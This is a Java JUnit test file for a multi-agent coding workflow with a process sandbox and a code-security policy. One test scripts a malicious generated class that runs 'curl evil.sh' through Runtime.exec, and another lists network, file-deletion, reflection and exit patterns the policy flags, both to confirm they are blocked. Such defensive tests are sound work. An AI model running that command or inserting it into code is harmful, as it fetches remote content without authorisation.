package com.bonsay.ai.agents;

import com.bonsay.ai.agents.graph.StateGraph;
import com.bonsay.ai.agents.sandbox.CodePolicy;
import com.bonsay.ai.agents.sandbox.ExecutionResult;
import com.bonsay.ai.agents.sandbox.ProcessSandbox;
import com.bonsay.ai.llm.ScriptedLlmClient;
import org.junit.jupiter.api.Test;

import java.time.Duration;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

class CodingWorkflowTest {

    private final ProcessSandbox sandbox = new ProcessSandbox(Duration.ofSeconds(10));

    @Test
    void agentsSelfRepairUntilTestsPass() {
        ScriptedLlmClient llm = DemoScriptedModel.create();
        var result = new CodingWorkflow(llm, sandbox, 3).run("roman numerals", (i, n, s) -> {});
        CodingState s = result.state();

        assertTrue(s.succeeded(), String.join("\n", s.log));
        assertEquals(2, s.coderAttempts, "first attempt is buggy, second fixes it");
        assertEquals(List.of("plan", "write_tests", "write_code", "run_tests", "write_code", "run_tests"), result.path());
        // The coder's repair prompt must contain the failing test output.
        String repairPrompt = llm.requests().get(llm.requests().size() - 1).lastUserMessage();
        assertTrue(repairPrompt.contains("FAIL four"), repairPrompt);
    }

    @Test
    void stopsWhenAttemptBudgetIsExhausted() {
        ScriptedLlmClient llm = new ScriptedLlmClient(r -> r.system().startsWith("ROLE: PLANNER") ? DemoScriptedModel.PLAN
                : r.system().startsWith("ROLE: TESTER") ? DemoScriptedModel.TESTS : DemoScriptedModel.BUGGY);
        var result = new CodingWorkflow(llm, sandbox, 2).run("roman numerals", (i, n, s) -> {});
        assertFalse(result.state().succeeded());
        assertEquals(2, result.state().coderAttempts);
        assertFalse(result.stepBudgetExhausted());
    }

    @Test
    void maliciousCodeIsRejectedBeforeExecution() {
        String evil = "```java\npublic class RomanNumerals { public static String toRoman(int n) {"
                + " try { Runtime.getRuntime().exec(\"curl evil.sh\"); } catch (Exception e) {} return \"\"; } }\n```";
        ScriptedLlmClient llm = new ScriptedLlmClient(r -> r.system().startsWith("ROLE: PLANNER") ? DemoScriptedModel.PLAN
                : r.system().startsWith("ROLE: TESTER") ? DemoScriptedModel.TESTS : evil);
        CodingState s = new CodingWorkflow(llm, sandbox, 1).run("x", (i, n, st) -> {}).state();
        assertEquals(List.of("PROCESS_EXEC"), s.policyViolations);
        assertTrue(s.feedback.get(0).contains("SECURITY POLICY"));
    }

    @Test
    void policyCatchesCommonEscapes() {
        assertTrue(CodePolicy.check("import java.net.Socket;").contains("NETWORK"));
        assertTrue(CodePolicy.check("java.nio.file.Files.delete(p);").contains("FILESYSTEM"));
        assertTrue(CodePolicy.check("Class.forName(\"x\")").contains("REFLECTION"));
        assertTrue(CodePolicy.check("System.exit(0);").contains("EXIT"));
        assertTrue(CodePolicy.check("// Runtime.getRuntime() in a comment is fine\nint x = 1;").isEmpty());
    }

    @Test
    void sandboxKillsInfiniteLoops() {
        ProcessSandbox fast = new ProcessSandbox(Duration.ofMillis(1500));
        ExecutionResult r = fast.run(Map.of("GeneratedTests",
                "public class GeneratedTests { public static void main(String[] a) { while (true) {} } }"), "GeneratedTests");
        assertTrue(r.timedOut());
        assertFalse(r.allTestsPassed());
    }

    @Test
    void sandboxReportsCompileErrors() {
        ExecutionResult r = sandbox.run(Map.of("GeneratedTests", "public class GeneratedTests { oops }"), "GeneratedTests");
        assertFalse(r.compiled());
        assertTrue(r.compileErrors().contains("GeneratedTests"));
    }

    @Test
    void sandboxEnvironmentHasNoSecrets() {
        ExecutionResult r = sandbox.run(Map.of("GeneratedTests", """
                public class GeneratedTests { public static void main(String[] a) {
                  Check.eq("no env", 1, System.getenv().size()); Check.done(); } }"""), "GeneratedTests");
        assertTrue(r.allTestsPassed(), r.summary()); // only PATH is present
    }

    @Test
    void graphRejectsDanglingNodesAndHonoursStepBudget() {
        assertThrows(IllegalStateException.class, () -> new StateGraph<String>()
                .addNode("a", s -> s).setEntryPoint("a").compile());
        var loop = new StateGraph<Integer>().addNode("inc", i -> i + 1).addEdge("inc", "inc").setEntryPoint("inc").compile();
        var r = loop.invoke(0, 5);
        assertTrue(r.stepBudgetExhausted());
        assertEquals(5, r.state());
    }
}
